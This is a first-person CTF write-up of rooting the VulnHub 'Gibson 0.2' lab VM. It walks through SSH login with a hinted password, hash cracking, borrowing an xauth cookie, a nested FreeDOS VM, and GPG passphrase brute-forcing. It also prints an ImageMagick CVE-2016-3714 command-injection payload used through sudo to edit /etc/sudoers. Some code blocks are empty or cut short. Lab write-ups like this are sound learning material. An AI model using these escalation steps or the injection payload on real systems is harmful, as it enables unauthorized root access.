title: Gibson 0.2

I decided to get started in the world of CTF writeups with this [VM](https://www.vulnhub.com/entry/gibson-02,146/) made by [Knightmare](https://twitter.com/@knightmare2600)! The description promised some unexpected twists, but at the same time it didn't seem to be heavy on reversing and/or binary exploitation, so I felt it was a good place to start. Without further ado, let's begin!

## Service discovery

The starting point is always finding out which services are running on the open ports, so let's do that.

```
root@kali:~# nmap -A -p1-65535 192.168.56.102

```

Of course I was not going to be able to straightforward SSH in, so I'd better check what's in the web server.

## Web server

I opened Iceweasel and navigated to port 80. There was a single file listed: `davinci.html`

```
<!-- Damn it Margo! Stop setting your password to "god" -->
<!-- at least try and use a different one of the 4 most -->
<!-- common ones! (eugene) -->
<h1> The answer you seek will be found by brute force</h1>
```

This seemed a pretty clear hint to the SSH credentials. I tried the ssh users `Margo`, `davinci`, `root` and `eugene`
but neither was asked for a password (only publickey). I thought in being explicit, just in case:

```
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no 192.168.56.102
```

But no luck, the password login was disabled.

...Then I noticed I had tried `Margo`, not `margo`, and guess what?

```
ssh margo@192.168.56.102 #god
```

Bingo. 

## Margo

Of course `sudo su` didn't work (it would have been too easy, right?) but I was luckier with `sudo -l`. It seemed that `margo` could run `/usr/bin/convert` as root. The binary was part of the ImageMagick tool... which reminded of [CVE-2016-3714](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2016-3714).

After some research, I managed to run commands as root exploiting said vulnerability. The fastest way to get root with this was to edit the sudoers file, but before that I played around a little.

```

I cracked the hashes for `duke` and `eugene` with John the Ripper, which was surprisingly fast.

## Eugene

`duke` seemed a pretty normal user, but `eugene` was good news. From the sudoers file I found out that `eugene` could execute another command as root:

```
eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager 
```

Which I honestly had no idea what it was. After some googling, I learned that `virt-manager` is a VM manager! Then I remembered the hints given at the description of the challenge:

>- It doesn't matter what your local subnet is, as long as you keep away from the 192.168.122.0/24 subnet.
>- SSH can forward X11.
>- The challenge isn't over with root. The flag is not where you expect to find it.

The network part was interesting.

```

Wow, so there was actually another active interface: `virbr0`. Could it be that, inside the VM, there was ANOTHER VM?

The thing was that I couldn't SSH as `eugene` directly, because of the no-password restriction. I could've added a public key to his home directory or disabled the restriction, but rather I just `su`'d  into him.

...Which was a pain, because when running `sudo virt-manager` it complained about the X11 authentication failing. Of course, I didn't have an `xauth` cookie for `eugene`. So I copied it from `margo`.

```
root@kali:~/gibson# ssh -X margo@192.168.56.102
Ubuntu 14.04.3 LTS
margo@192.168.56.102's password: #god
margo@gibson:~$ xauth list
gibson/unix:10  MIT-MAGIC-COOKIE-1  01dccb5a0820e7f65c5211528c49c0eb
margo@gibson:~$ su eugene
Password: #secret
eugene@gibson:/home/margo$ xauth add gibson/unix:10  MIT-MAGIC-COOKIE-1  01dccb5a0820e7f65c5211528c49c0eb
eugene@gibson:/home/margo$ sudo /usr/bin/virt-manager
```

Holy f*ck, I got in.

### Note
Of course, I could've always modified the `/etc/sudoers` file and get root directly:

```
sudo convert 'https://example.com"|vi "/etc/sudoers' out.png
```

Change the following line:

```
margo ALL=(ALL) NOPASSWD: ALL#/usr/bin/convert
```

And voil√†.

```
margo@gibson:~$ sudo su
root@gibson:/home/margo# 
```

## FreeDOS?

The virt-manager GUI appeared, and only one machine named "ftpserv" existed. I opened a shell by double-clicking it and discovered that it was running a FreeDOS :-O Had to Google quite a bit at this point...

Once I thought I could continue, I started by exploring the directories. After a `dir` I found this directory named GARBAGE which catched my attention.

```
cd garbage
dir

ADMINSPO.JPG
FLAG.IMG
JZ_UG.ANS
```

The FLAG.IMG seemed interesting, but I had to find a way to take it outside the box.

I decided to go big and copied the full VM disk image to my Kali box. I'm subtle as that :)

At this point, the root permissions became a need, so I modified the sudoers file as explained before.

```
margo@gibson:~$ sudo su
root@gibson:/home/margo# cp /var/lib/libvirt/images/ftpserv.img /tmp/
root@gibson:/home/margo# chown margo /tmp/ftpserv.img
```

And then I was able to get it from my Kali:

```
root@kali:~# scp margo@192.168.56.102:/tmp/ftpserv.img gibson
```

## Getting the flag

I mounted the image (fun name, KFLYNN, Kevin Flynn from Tron!) and went to `garbage`.

There I ran `exiftool` to peek on the metadata of the JPG file:

```

Fun, but not useful anymore :)

So it was time to mount `flag.img`.

There were three files, an executable program, its source code in C, and a hint.txt file.

```
root@kali:/media/root/d59bdd40-ec37-4d24-a956-80f549846121# cat hint.txt
http://www.imdb.com/title/tt0117951/ and
http://www.imdb.com/title/tt0113243/ have
someone in common... Can you remember his
original nom de plume in 1988...?
```

So it turns out Trainspotting and Hackers have the actor Jonny Lee Miller in common. I had to search what "nom de plume" meant (lol), but I quickly learnt it translates to "nickname". I guess I should've known that already but... Whatever, Miller's nickname in Hackers (which takes place in 1988) is "Zero Cool/Crash Override". But what do I do with that?

I have to say I spent quite too much time trying to break the game in order to get something interesting. Modified the `highscores.txt` file trying to make it crash, entered ZeroCool and CrashOverride as users just in case, played around with the snake (fun game btw), but eventually...

```
root@kali:/media/root/d59bdd40-ec37-4d24-a956-80f549846121# ls -la

drwxr-xr-x  4 root root  1024 May 14 15:07 .

drwx------  2 root root 12288 May  5 20:39 lost+found
drwxr-xr-x  2 root root  1024 May  5 21:07 .trash
```

Yeah, maybe I should have started by doing that.

```
root@kali:/media/root/d59bdd40-ec37-4d24-a956-80f549846121# cd .trash/
root@kali:/media/root/d59bdd40-ec37-4d24-a956-80f549846121/.trash# ls -la
total 319
drwxr-xr-x 2 root root   1024 May  5 21:07 .
drwxr-xr-x 4 root root   1024 May 14 15:07 ..

-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg
```
So now I need the passpharse to decrypt the flag! Could it be that the `hint.txt` was referring to this?

Tried the `gpg` command with `ZeroCool`, `zerocool`, `CrashOverride` and `crashoverride` as passphrases to no avail. I ran `exiftool` on the jpg file, but there was nothing interesting.

So I decided to go full bruteforce and generated some wordlists with [cupp](https://github.com/Mebus/cupp)'s interactive mode.

```
root@kali:~/gibson# ~/cupp.py -i
...
root@kali:~/gibson# for i in $(cat ~/cupp/zero.txt); do gpg --passphrase $i flag.txt.gpg; if [ -a "flag.txt" ]; then echo "Passphrase found! $i"; break; fi; done
```

After some tries and combinations, what finally made the trick was including the word 'ZeroKool' AND activating the tool's l33t mode.

```
...
gpg: CAST5 encrypted data
gpg: encrypted with 1 passphrase
gpg: WARNING: message was not integrity protected

Should you not be standing in a 360 degree rotating payphone when reading
this flag...? B-)

Anyhow, congratulations once more on rooting this VM. This time things were
a bit esoteric, but I hope you enjoyed it all the same.

Shout-outs again to #vulnhub for hosting a great learning tool. A special
thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
to host the CTF once more.
                                                              --Knightmare
```

Phew! For my first CTF writeup, this one surely got me confused for a while and made me take my time! I'm sure this could have been done better/faster, but nonetheless I managed to complete it. Big thanks to Knightmare for the fun challenege, I really enjoyed the movie references and learned quite a few new things (special mention to the whole FreeDOS thing!)
